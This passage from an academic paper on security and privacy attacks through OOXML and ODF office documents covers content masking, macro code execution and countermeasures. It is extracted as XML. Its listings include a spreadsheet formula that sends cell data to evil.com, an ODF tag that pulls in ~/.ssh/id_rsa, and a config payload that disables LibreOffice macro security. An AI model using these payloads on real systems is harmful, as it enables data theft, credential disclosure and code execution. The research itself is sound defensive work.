LibreOffice.&lt;/w:t&gt; &lt;/w:r&gt; &lt;/w:p&gt; &lt;/w:body&gt; &lt;/w:document&gt; Listing 9: Ambigious document.xml including two w:body nodes.</p><p>The document.xml file contains two body elements, wrapped into each other. LibreOffice processes only the second body nodes and displays the contained text, while MS Office parses both body nodes. 14 While this is not valid XML within the OOXML schema it is still accepted by both implementations.</p><p>It must be noted that, in this work, we only analyzed content masking on the layers of the directory structure and the outer XML structure. This is unlikely to be complete because the high-level syntax of OOXML and ODF is very complex and potentially offers more possibilities to show/hide text based upon enabled/disabled features in processing applications.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="5.5">Code Execution</head><p>Macros The execution of macros is disabled by default and the user has to explicitly enable it in both Microsoft Office and LibreOffice. However, there are some exceptions for documents signed by a trusted entity and documents within a trusted location, as summarized in <ref type="table">Table 6.</ref> MS Office LibreOffice document signed by a trusted entity document contained in a trusted location <ref type="table">Table 6</ref>: Exceptions for disabled macros in the default settings.</p><p>In MS Office, the default setting is to disable macros while notifying the user about the existence of the macro. However, documents signed by trusted publishers or documents in trusted locations can execute macros, regardless of the macro settings. This means that if an attacker has write access to any of these pre-defined trusted locations, the attacker can put macro code here, which is executed without any confirmation. In LibreOffice, there are no pre-defined trusted locations. Furthermore, UI design weaknesses regarding macro security dialogues have been identified by Dormann <ref type="bibr" target="#b24">[26]</ref> who concludes that recent versions of MS Office make it much easier for the user to make the wrong decision.</p><p>While social engineering is usually required to activate macros, once enabled, there is no limitation regarding their capabilities. In MS Office, macros are written in Visual Basic for Applications (VBA). Enabled macros allow the execution of arbitrary commands on the host system, see Listing 10. In LibreOffice, arbitrary shell commands can be executed with the BASIC code given in Listing 11. LibreOffice macros additionally support JavaScript and Python code to be executed. To conclude, macros provide code execution "by design" in both office suites. We do not consider this a vulnerability, as the user has to activate an evidently insecure feature willingly. However, during our research, we discovered further weaknesses, leading to code execution in both tested office suites. When testing for URL invocation in MS Office, we stumbled upon a memory corruption caused by HTML code given below. &lt;acronym&gt;&lt;style&gt;&lt;body&gt;&lt;acronym&gt; To our surprise, Microsoft classified this accidental finding as remote code execution in MS Office, with a CVSS score of 9.3. However, we classify the vulnerability as limited because 1. it was found by accident, not by any systematic approach; 2. it is merely an implementation bug, not a standard-conforming document feature; and 3. it is not strictly a bug in OOXML, but in the XHTML parser of Microsoft Office.</p><p>Furthermore, we found that the feature to submit XForms to files on disk can be escalated to code execution in LibreOffice. One way to achieve this is by submitting malicious XML data to the configuration file of LibreOffice itself, as given below.</p><p>file:///~/.config/libreoffice/4/user/registrymodifications.xcu</p><p>The malicious XML contains new configuration settings (see Listing 12) to allow arbitrary macros, which can then be automatically launched, for example, once the malicious document is closed, in order to execute arbitrary shell commands.</p><p>&lt;oor:items xmlns:oor="http://openoffice.org/2001/registry"&gt; &lt;item oor:path="/org.openoffice.Office.Common/Security/Scripting"&gt; &lt;prop oor:name="MacroSecurityLevel" oor:op="fuse"&gt; &lt;value&gt;0&lt;/value&gt; &lt;/prop&gt; &lt;/item&gt; &lt;/oor:items&gt; Listing 12: XForm data to write to the LibreOffice configuration file, thereby allowing arbitrary macros to be executed in any document.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="6">Countermeasures</head><p>In this section, we discuss mitigations, countermeasures, and common best practices to be applied by security-focused OOXML and ODF implementations, as well as the specification.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="6.1">Removing Insecure Features</head><p>Aside from short-term mitigations based on implementation fixes for certain attacks (e.g., disallowing XForms to submit data to local files), the standard should remove dangerous functionality that is rarely used, such as the possibility to include external files in a document. Unfortunately, it depends on the use case and is not always clear which features can be classified as "insecure". For example, macros can be used for benign purposes such as inserting a company's letterhead into a document as well as to install malware. This all-ornothing approach regarding macros is debatable. It enables code execution by design, once allowed by the user. In general, the feature richness of OOXML and ODF is problematic from a security point of view. The authors think that office document security and privacy would benefit from reduced complexity. Both major office suites, Microsoft Office and LibreOffice, could gain from modern architectures, which include a granular permission system. For example, an office application should ask the user for a network permissions when accessing the corresponding APIs and even if macros are allowed, their capabilities should be restricted (e.g., using sandboxing).</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="6.2">Privacy by Default</head><p>Office suites should not allow documents to silently open network connections. If remote content has to be supported at all, the user should be asked for confirmation before making any network connections to a third party. Furthermore, metadata included in saved or exported documents should be reduced to a minimum in the default settings to prevent unintended exposure of potentially sensitive information such as usernames.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="6.3">Limitation of Resources</head><p>Data decompression should halt, once the overall size of the decompressed data exceeds an upper limit -a best practice discussed, for example, by <ref type="bibr">Pellegrino [58]</ref> in order to protect against compression bombs. This mitigation strategy should be implemented by modern office suites in order to prevent malicious documents from consuming all available resources.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="6.4">Elimination of Ambiguities</head><p>To counter content masking attacks, specifications need to be precise regarding which parts of the document structure are to be processed and displayed, thereby allowing no room for interpretation by implementations. It must, however, be noted that eliminating ambiguities and edge cases is a challenging task because the OOXML and ODF standards are very complex. Furthermore, unambiguous specifications would only protect the document structure and not prevent high-level conditional statements, for example, embedded within spreadsheet formulas or macros, which may also be abused to display ambiguous content based on certain pre-defined conditions.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="7">Conclusion</head><p>OOXML and ODF are feature-rich office document formats. While the risks of some delicate features such as macros are well-known to the general public, others are unknown even to security experts. In this work, we performed a systematic analysis of dangerous functionality provided by OOXML and ODF, and evaluated the de facto reference implementations, MS Office and LibreOffice. Besides giving a comprehensive survey of past attacks based on malicious office documents, we propose various novel approaches, for example, leading to arbitrary code execution in LibreOffice, based on pure logic chain exploitation of legitimate features.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head>A.3 Future Research Directions</head><p>In this section, we discuss attack targets beyond office suites and propose future research directions and challenges.</p><p>Attacks on Printers Attacks against network printers are traditionally bound to printer-specific protocols and data formats such as PostScript, PJL, or PCL <ref type="bibr" target="#b53">[55]</ref>. However, many modern printers and MFPs have native support for directly processing OOXML documents and putting them onto paper -without the need for additional printer drivers to convert between data formats. Our attacks may be applicable to such embedded OOXML interpreters running on printing devices, for example, in order to cause DoS on a printer or to include sensitive files from its hard disk. Furthermore, OOXML has a feature to embed PostScript within a document (&lt;w:printPostScriptOverText&gt;). This feature may be used to hide malicious PostScript code, for example, in Word documents, to be executed on the printer.</p><p>Attacks on Web Applications In this work, we only tested Office 365 Cloud and LibreOffice Online. However, there are a lot more web applications capable of processing OOXML and ODF files. Besides importing malicious documents into further online word processors such as Google Docs, office documents are processed on cloud storage services such as Dropbox, which generate preview images for uploaded files. One attack class of particular interest is reading local files, because the impact can be considered more severe on a server than on a client. For LFI (local file inclusion) attacks based on malicious OOXML/ODF documents, the backchannel to exfiltrate files can be the rendered document itself. However, other web attacks such as SSRF or CSRF (cf. <ref type="bibr" target="#b12">[14,</ref><ref type="bibr" target="#b57">59]</ref>) could also potentially be performed based on URL invocation features, depending on whether the document is processed on the server-side or on the client-side (i.e. by the web browser).  Adapting Content Masking Attacks It would be interesting to broaden the scope of our attacks based on ambiguities when parsing OOXML/ODF documents. Content masking attacks could be extended to other domains:</p><p>1. Anti-virus and malware detection tools may be tricked to scan only benign parts of a malicious office document.</p><p>2. Plagiarisms detection software may be deceived into checking another text than the one shown in office suites.</p><p>3. Search engines indexing text found in office documents could be mislead to rank up documents containing spam.</p><p>Similar attacks have been shown by Markwood et al. <ref type="bibr" target="#b45">[47]</ref> in the context of ambiguous PDF files and could be adapted to OOXML/ODF, which is to be considered as future research.</p><p>Fuzzing OOXML an ODF As described in subsection 5.5, we accidentally, without performing any targeted file format fuzzing, found a memory corruption in the XHTML parser of MS Office, which was classified by Microsoft as remote code execution with a CVSS score of 9.3.</p><p>Considering this coincidental issue, future research should concentrate on fuzzing of OOXML and ODF. Given the complexity of both data formats, this may reveal further vulnerabilities in office suites as well as other OOXML and ODF processing applications. Office file format fuzzing can occur on multiple layers such as the physical structure (zip archive), the logical structure (i.e., file and directory names), as well as on the XML syntax level providing countless methods for malicious user input, which could be modeled.</p><p>Automated Specification Analysis During our study, we struggled with the manual analysis of the extensive specifications of OOXML and ODF. We searched for existing approaches to automate the manual processing. We found only one tool called Delution for automated documentation analysis and capable of discovering potential gaps <ref type="bibr" target="#b15">[17]</ref>. Unfortunately, we were not able to adapt Delution to analyze the specifications due to execution exceptions and missing support to analyze the documentation files. Although further improvements are needed, such approaches look promising.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head>A.4 Acknowledgements</head><p>Jens Müller was supported by the research training group "Human Centered System Security", sponsored by the state of North Rhine-Westfalia. Fabian Ising was supported by the research project "MITSicherheit.NRW" funded by the European Regional Development Fund North Rhine-Westphalia (EFRE.NRW) and by a graduate scholarship of Münster University of Applied Sciences. In addition, this work was supported by the German Research Foundation (DFG) within the framework of the Excellence Strategy of the Federal Government and the States -EXC 2092 CASA.</p></div><figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_0"><head></head><label></label><figDesc>Listing 1: Minimal OOXML example document (document.xml).</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_1"><head></head><label></label><figDesc>Listing 2: Minimal ODF example document (content.xml).</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_2"><head></head><label></label><figDesc>&lt;Relationship Id="evil" Target="http://evil.com/tracking_id/" TargetMode="External"/&gt; It contains a field with an external image. This Relationship must further be referenced from the main document.xml file.</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_3"><head></head><label></label><figDesc>&lt;pic:blipFill&gt;&lt;a:blip r:link="evil"/&gt; In ODF documents, external images can be included by setting their URL to the value of an href attribute of an &lt;draw:image&gt; XML tag as depicted in Listing 3. &lt;office:document-content&gt; &lt;office:body&gt; &lt;office:text&gt; &lt;text:p&gt; &lt;draw:frame&gt; &lt;draw:image xlink:href="http://evil.com/tracking_id/"/&gt; &lt;/draw:frame&gt; &lt;/text:p&gt; &lt;/office:text&gt; &lt;/office:body&gt; &lt;/office:document-content&gt; Listing 3: Minimal ODF document with a tracking pixel of evil.com</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_4"><head></head><label></label><figDesc>Microsoft Office LibreOffice OOXML ODF PDF HTML ODF OOXML PDF HTML Timestamp Software Username stored in metadata not stored in metadata</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_5"><head></head><label></label><figDesc>8 &lt;cp:coreProperties&gt; &lt;dc:creator&gt;John Smith&lt;/dc:creator&gt; &lt;cp:lastModifiedBy&gt;Jane Smith&lt;/cp:lastModifiedBy&gt; &lt;dcterms:created&gt;2020-03-14T15:52:00Z&lt;/dcterms:created&gt; &lt;dcterms:modified&gt;2020-03-14T15:55:00Z&lt;/dcterms:modified&gt; &lt;/cp:coreProperties&gt; Listing 4: Excerpt of OOXML metadata generated by MS Office.</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_6"><head></head><label></label><figDesc>=WEBSERVICE(TEXTJOIN("|", 1, "http://evil.com/", A:Z))</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_7"><head>Listing 6 :</head><label>6</label><figDesc>XML to include image files on disk into ODF document.</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_8"><head></head><label></label><figDesc>&lt;text:section&gt; &lt;text:section-source xlink:href="file:///~/.ssh/id_rsa"/&gt; &lt;/text:section&gt; Listing 7: XML to include arbitrary files on disk into ODF document.</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_9"><head></head><label></label><figDesc>Sub AutoOpen() Shell ("[command] [parameters]") End Sub Listing 10: Macro to execute shell commands in OOXML documents.</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" xml:id="fig_10"><head></head><label></label><figDesc>sub Main shell "[command] [parameters]" end sub Listing 11: Macro to execute shell commands in ODF documents.</figDesc></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" type="table" xml:id="tab_1" validated="false"><head></head><label></label><figDesc>in 2016. Microsoft Office uses OOXML since 2007, while previous versions of MS Office saved doc- uments in a proprietary data format. In Table 2, a directory listing of the files contained in an OOXML zip archive is given.</figDesc><table>File 

Description 

./[Content_Types].xml 

List of all package files 

./docProps/app.xml 

Metadata: sections, pages 

./docProps/core.xml 

Metadata: author, timestamps 

./_rels/.rels 

Relationships within and out-
side of the package 

./word/document.xml 

Document content 

./word/styles.xml 

Style of sections, content, etc. 

./word/settings.xml 

Application-specific settings 
./word/_rels/document.xml.rels References to images 

</table></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" type="table" xml:id="tab_2" validated="false"><head>Table 2 : Directory structure within an OOXML zip container archive.</head><label>2</label><figDesc></figDesc><table></table></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" type="table" xml:id="tab_4" validated="false"><head>Table 3 : Directory structure within an ODF zip container archive.</head><label>3</label><figDesc></figDesc><table></table></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" type="table" xml:id="tab_7" validated="false"><head>Table 4 : Evaluation results for Microsoft Office and LibreOffice.</head><label>4</label><figDesc></figDesc><table></table></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" type="table" xml:id="tab_8" validated="false"><head>Table 5 :</head><label>5</label><figDesc>Comparison of the metadata included by Microsoft Office and LibreOffice when saving or exporting to various file formats.</figDesc><table></table></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" type="table" xml:id="tab_10" validated="false"><head>Web Windows macOS Web Windows macOS Linux Web Windows macOS Linux Web</head><label></label><figDesc></figDesc><table>Microsoft Office (365 ProPlus) 

LibreOffice (6.4.0.3) 

OOXML 
ODF 
ODF 
OOXML 
Windows macOS Denial of Service 


-


-









URL Invocation 














Evitable Metadata 















Data Exfiltration 














File Disclosure 














Credential Theft 















File Write Access 














Content Masking 















Code Execution 















vulnerable 
vulnerability limited 
not vulnerable 
-not tested due to ethical concerns 

</table></figure>
<figure xmlns="http://www.tei-c.org/ns/1.0" type="table" xml:id="tab_11" validated="false"><head>Table 7 :</head><label>7</label><figDesc>Full evaluation of the proposed attacks on all available platforms.</figDesc><table></table></figure>

			<note place="foot" n="2"> For ethical reasons, we did not perform any DoS tests on third-party servers.</note>

			<note place="foot" n="3"> See https://www.torproject.org/. 4 For example, http://www.readnotify.com/readnotify/pmdoctrack.asp.</note>

			<note place="foot" n="5"> Both OOXML and ODF support digital XAdES [16] signatures.</note>

			<note place="foot" n="9"> We obtained the dataset by crawling the Cisco Umbrella 1 Million list of domains (see https://s3-us-west-1.amazonaws.com/umbrella-static/index.html). We collected available PDF files from their web servers, because PDF is more common in the web than OOXML or ODF, resulting in a larger sample.</note>

			<note place="foot" n="10"> Note that in the context of web applications, generated preview images of uploaded documents may act as an exfiltration channel for file inclusion. However, attacks on real-world websites are not in the scope of this work.</note>

			<note place="foot" n="11"> Note that using \\evil.com directly is also possible for OOXML, however it was blocked for ODF documents in both tested office suites. 12 See https://github.com/SpiderLabs/Responder.</note>

			<note place="foot" n="13"> When opening this file, MS Word asks the user to recover the document. Although we assume that a user who wants to access the content is willing to confirm the document recovery dialog, we classify the vulnerability as limited. 14 We classify the vulnerability as limited for MS Office, because the second body is still processed. Note however that the actual text can be hidden, for example, by adding newlines after the first text.</note>
		</body>
		<back>

			<div type="acknowledgement">
			</div>

			<div type="annex">
<div xmlns="http://www.tei-c.org/ns/1.0"><head>A Appendix</head></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head>A.1 Availability of Artifacts</head><p>We released a comprehensive test suite of malicious OOXML and ODF files which can be used by developers to test their software. All proof of concept files are available for download from https://github.com/RUB-NDS/Office-Security.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head>A.2 Full Evaluation Details</head><p>In <ref type="table">Table 7</ref>, we provide full evaluation details for both office suites, Microsoft Office and LibreOffice, on each tested platform. To perform tests for the Web platform, we used Office 365 Cloud (office.com) and LibreOffice Online (self-hosted).</p></div>			</div>
			<div type="references">

				<listBibl>

<biblStruct xml:id="b0">
	<monogr>
		<title level="m" type="main">ECMA-376 -Office Open XML File Formats</title>
		<imprint>
			<date type="published" when="2006" />
			<pubPlace>Standard, Ecma</pubPlace>
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b1">
	<monogr>
		<title level="m" type="main">Open Document Format for Office Applications (OpenDocument) Version 1.2. Standard, Organization for the Advancement of Structured Information Standards (OASIS)</title>
		<imprint>
			<date type="published" when="2011" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b2">
	<monogr>
		<title level="m" type="main">ISO/IEC 26300 Open Document Format for Office Applications (OpenDocument). Standard, International Organization for Standardization (ISO)</title>
		<imprint>
			<date type="published" when="2015" />
			<pubPlace>Geneva, CH</pubPlace>
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b3">
	<monogr>
				<title level="m">ISO/IEC 29500-1:2016 -Office Open XML File Formats. Standard, International Organization for Standardization (ISO)</title>
		<meeting><address><addrLine>Geneva, CH</addrLine></address></meeting>
		<imprint>
			<date type="published" when="2016" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b4">
	<monogr>
		<title level="m" type="main">Detection of Malicious VBA Macros Using Machine Learning Methods</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">E</forename><surname>Aboud</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>O&amp;apos;brien</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2018" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b5">
	<monogr>
		<title level="m" type="main">This PDF is a JPEG; or, This Proof of Concept is a Picture of Cats. PoC 11 GTFO 0x03</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Albertini</surname></persName>
		</author>
		<ptr target="https://www.alchemistowl.org/pocorgtfo/pocorgtfo03.pdf" />
		<imprint>
			<date type="published" when="2014" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b6">
	<monogr>
		<title level="m" type="main">Disclosing Private Information from Metadata, Hidden Info and Lost Data</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">C</forename><surname>Alonso</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">E</forename><surname>Rando</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">F</forename><surname>Oca</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Guzmán</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2008-08" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b7">
	<analytic>
		<title level="a" type="main">Information Flow in the Peer-Reviewing Process</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Backes</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Dürmuth</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Unruh</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">IEEE Symposium on Security and Privacy (S&amp;P)</title>
		<imprint>
			<date type="published" when="2007" />
			<biblScope unit="page" from="187" to="191" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b8">
	<monogr>
				<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Baharav</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Y</forename><surname>Fruchtmann</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">I</forename><surname>Solomon</surname></persName>
		</author>
		<ptr target="https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/" />
		<title level="m">NTLM Credentials Theft via PDF Files</title>
		<imprint>
			<date type="published" when="2018-04" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b9">
	<analytic>
		<title level="a" type="main">Automated Microsoft Office Macro Malware Detection Using Machine Learning</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">R</forename><surname>Bearden</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Lo</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">2017 IEEE International Conference on Big Data (Big Data)</title>
		<imprint>
			<date type="published" when="2017" />
			<biblScope unit="page" from="4448" to="4452" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b10">
	<monogr>
		<title level="m" type="main">Decompression Bomb Vulnerabilities</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">P</forename><surname>Bieringer</surname></persName>
		</author>
		<ptr target="http://aerasec.de/security/advisories/decompression-bomb-vulnerability.html" />
		<imprint>
			<date type="published" when="2001" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b11">
	<monogr>
		<title/>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Boyer</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Landwehr</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">R</forename><surname>Merrick</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">T</forename><surname>Raman</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2009" />
		</imprint>
	</monogr>
	<note>XForms 1.1. W3C Recommendation</note>
</biblStruct>

<biblStruct xml:id="b12">
	<monogr>
		<title level="m" type="main">Cross Site Request Forgery. An Introduction to a Common Web Application Weakness</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Burns</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2005" />
		</imprint>
	</monogr>
	<note>Information Security Partners</note>
</biblStruct>

<biblStruct xml:id="b13">
	<analytic>
		<title/>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Caloyannides</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">N</forename><surname>Memon</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">W</forename><surname>Venema</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">Digital Forensics. IEEE Security &amp; Privacy Magazine</title>
		<imprint>
			<biblScope unit="volume">7</biblScope>
			<biblScope unit="issue">2</biblScope>
			<biblScope unit="page" from="16" to="17" />
			<date type="published" when="2009" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b14">
	<monogr>
				<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Centner</surname></persName>
		</author>
		<title level="m">XML Advanced Electronic Signatures (XAdES)</title>
		<imprint>
			<date type="published" when="2003" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b15">
	<analytic>
		<title level="a" type="main">Devils in the Guidance: Predicting Logic Vulnerabilities in Payment Syndication Services through Automated Documentation Analysis</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Y</forename><surname>Chen</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">L</forename><surname>Xing</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Y</forename><surname>Qin</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">X</forename><surname>Liao</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">X</forename><surname>Wang</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">K</forename><surname>Chen</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">W</forename><surname>Zou</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">28th USENIX Security Symposium</title>
		<imprint>
			<date type="published" when="2019" />
			<biblScope unit="page" from="747" to="764" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b16">
	<monogr>
		<title level="m" type="main">Frankfurt Shuts Down IT Network Following Emotet Infection</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">C</forename><surname>Cimpanu</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><surname>Zdnet</surname></persName>
		</author>
		<ptr target="https://www.zdnet.com/article/frankfurt-shuts-down-it-network-following-emotet-infection/" />
		<imprint>
			<date type="published" when="2019-12" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b17">
	<monogr>
		<title level="m" type="main">Use an 8-char Windows NTLM password?</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">T</forename><surname>Claburn</surname></persName>
		</author>
		<ptr target="https://www.theregister.co.uk/2019/02/14/password_length/" />
		<imprint>
			<date type="published" when="2019-02" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b18">
	<analytic>
		<title level="a" type="main">SFEM: Structural Feature Extraction Methodology for the Detection of Malicious Office Documents Using</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Aviad</forename><surname>Cohen</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Nir</forename><surname>Nissim</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Lior</forename><surname>Rokach</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Yuval</forename><surname>Elovici</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">Machine Learning Methods. Expert Systems with Applications</title>
		<imprint>
			<biblScope unit="volume">63</biblScope>
			<biblScope unit="page" from="324" to="343" />
			<date type="published" when="2016" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b19">
	<monogr>
		<title level="m" type="main">Postscript: Danger ahead?! Hack in Paris</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Costin</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2012" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b20">
	<monogr>
		<title level="m" type="main">Zip files all the way down</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">R</forename><surname>Cox</surname></persName>
		</author>
		<ptr target="https://research.swtch.com/zip" />
		<imprint>
			<date type="published" when="2010-03" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b21">
	<monogr>
				<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Dechaux</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">E</forename><surname>Filiol</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Fizaine</surname></persName>
		</author>
		<title level="m">Office Documents: New Weapons of Cyberwarfare. Hack.Lu</title>
		<imprint>
			<date type="published" when="2010" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b22">
	<monogr>
		<title level="m" type="main">DEFLATE Compressed Data Format Specification</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">P</forename><surname>Deutsch</surname></persName>
		</author>
		<imprint>
			<date type="published" when="1996" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b23">
	<monogr>
		<title level="m" type="main">Forensic Analysis of OOXML Documents</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">E</forename><surname>Didriksen</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2014" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b24">
	<monogr>
		<title level="m" type="main">Who Needs to Exploit Vulnerabilities When You Have Macros? DerbyCon</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">W</forename><surname>Dormann</surname></persName>
		</author>
		<ptr target="https://insights.sei.cmu.edu/cert/2016/06/who-needs-to-exploit-vulnerabilities-when-you-have-macros.html" />
		<imprint>
			<date type="published" when="2016" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b25">
	<monogr>
		<title level="m" type="main">ZIP File Quine</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">E</forename><surname>Ellingsen</surname></persName>
		</author>
		<ptr target="http://www.steike.com/code/useless/zip-file-quine/" />
		<imprint>
			<date type="published" when="2005" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b26">
	<analytic>
		<title level="a" type="main">A better zip bomb</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Fifield</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">13th USENIX Workshop on Offensive Technologies (WOOT 19)</title>
		<imprint>
			<date type="published" when="2019" />
		</imprint>
	</monogr>
